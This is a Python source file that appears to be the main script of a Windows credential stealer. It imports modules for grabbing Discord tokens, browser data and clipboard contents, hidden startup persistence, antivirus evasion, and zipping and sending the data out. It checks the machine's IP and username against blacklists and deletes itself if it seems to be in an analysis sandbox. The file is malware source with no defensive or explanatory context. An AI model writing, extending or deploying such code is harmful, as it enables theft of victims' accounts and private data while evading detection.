import time, requests, threading, sys
from components.wtoken import DiscordToken
from browsers.browserinfo import getinfo
from components.zipandsend import zipnsend
from components.info import sendinfo
from components.clipboard import steal_data
from components.startup import hiddenstartup
from components.confirmsend import confirmsend
from components.antiantivirus import antiantivirus
from blacklist.ips import blacklisted_ips
from blacklist.names import badnames
import os, ctypes
token_extractor = DiscordToken()


def check_blacklist():
    user_ip = requests.get('https://api.ipify.org').text
    user_name = os.popen('whoami').read().strip().split("\\")[-1].replace(' ', '').lower()
    if user_ip in blacklisted_ips or user_name in [name.lower() for name in badnames]:
        exe_path = sys.argv[0]
        os.remove(exe_path)
        ctypes.windll.kernel32.ExitProcess(0)
    return True

def browser():
    threads = [
        threading.Thread(target=getinfo),
        threading.Thread(target=hiddenstartup),
        threading.Thread(target=steal_data)
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def start_token_saver():
    threading.Thread(target=token_extractor.save_tokens).start()

if check_blacklist():
    antiantivirus()
    browser()
    sendinfo()
    confirmsend()
    time.sleep(1)
    zipnsend()
    start_token_saver()

